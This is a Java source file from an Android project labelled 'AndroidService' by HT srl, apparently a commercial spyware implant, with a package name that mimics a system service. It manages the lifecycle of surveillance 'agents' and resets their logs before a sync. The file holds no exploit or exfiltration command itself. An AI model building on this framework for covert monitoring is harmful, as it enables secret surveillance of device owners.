/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.agent;

import java.util.HashMap;
import java.util.Iterator;

import com.android.service.Manager;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAgent;
import com.android.service.conf.ConfigurationException;
import com.android.service.interfaces.IncrementalLog;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class AgentManager.
 */
public class ManagerAgent extends Manager<BaseAgent, String, String> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static ManagerAgent singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static ManagerAgent self() {
		if (singleton == null) {
			synchronized (ManagerAgent.class) {
				if (singleton == null) {
					singleton = new ManagerAgent();
					singleton.setFactory(new FactoryAgent());
				}
			}
		}

		return singleton;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	@Override
	public synchronized boolean startAll() {
		HashMap<String, ConfAgent> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		if (running == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		final Iterator<String> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final String key = it.next();
			if (Cfg.DEBUG) {
				Check.asserts(key != null, "null type"); //$NON-NLS-1$
			}
			final ConfAgent conf = agents.get(key);
			start(key);

		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	@Override
	public synchronized void stopAll() {
		HashMap<String, ConfAgent> agents;
		agents = status.getAgentsMap();
		final Iterator<String> it = agents.keySet().iterator();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");//$NON-NLS-1$
		}

		while (it.hasNext()) {
			final String key = it.next();
			stop(key);
		}

		if (Cfg.DEBUG) {
			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.ensures(running.size() == 0, "Non empty running"); //$NON-NLS-1$
		}

		running.clear();
		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	@Override
	public synchronized void start(final String key) {
		HashMap<String, ConfAgent> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return;
		}

		if (running == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return;
		}

		BaseAgent a = makeAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.isRunning() || a.isSuspended()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + key + " is already running or suspended");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		a = makeAgent(key);

		if (Cfg.DEBUG) {
			Check.asserts(a != null, "null agent"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(running.get(key) != null, "null running"); //$NON-NLS-1$
		}
		
		if(	a.setConf(agents.get(key)) ){
			final Thread t = new Thread(a);
			if (Cfg.DEBUG) {
				t.setName(a.getClass().getSimpleName());
			}
			threads.put(a, t);
			t.start();
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) Error: Cannot set Configuration");
			}
		}

	}

	private BaseAgent makeAgent(String type) {
		if (running.containsKey(type) == true) {
			return running.get(type);
		}

		final BaseAgent base = factory.create(type);

		if (base != null) {
			running.put(type, base);
		}

		return base;
	}

	/**
	 * Stop agent.
	 * 
	 * @param moduleId
	 *            the key
	 */
	@Override
	public synchronized void stop(final String moduleId) {
		final BaseAgent a = running.get(moduleId);

		if (a == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + moduleId + " not present");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		a.stopThread();
		running.remove(moduleId);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
			threads.remove(a);
		}
	}

	/**
	 * resets incremental logs before sync
	 */
	public void resetIncrementalLogs() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetIncrementalLogs)");
		}
		for (BaseAgent agent : threads.keySet()) {
			if (agent != null && agent instanceof IncrementalLog) {
				((IncrementalLog) agent).resetLog();
			}
		}

		Utils.sleep(2000);
	}

}
